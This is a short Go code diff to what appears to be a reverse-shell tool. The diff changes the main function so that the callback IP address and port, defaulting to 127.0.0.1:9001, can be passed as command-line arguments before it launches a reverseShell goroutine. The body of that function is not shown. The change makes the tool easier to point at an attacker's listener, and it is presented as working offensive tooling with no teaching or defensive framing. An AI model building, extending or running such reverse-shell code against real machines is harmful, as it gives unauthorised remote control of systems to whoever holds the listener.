@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"io"
 	"net"
+	"os"
 	"os/exec"
 	"runtime"
 	"sync"
@@ -60,9 +61,19 @@ func reverseShell(ip string, port string, wg *sync.WaitGroup) {
 func main() {
 	var wg sync.WaitGroup
 
-	// Set Me Up
+	// Set default values
 	Addr := "127.0.0.1"
 	Port := "9001"
+
+	// Check if IP address provided as argument
+	if len(os.Args) >= 2 {
+		Addr = os.Args[1]
+	}
+
+	// Check if port provided as argument
+	if len(os.Args) >= 3 {
+		Port = os.Args[2]
+	}
 
 	wg.Add(1)
 	go reverseShell(Addr, Port, &wg)
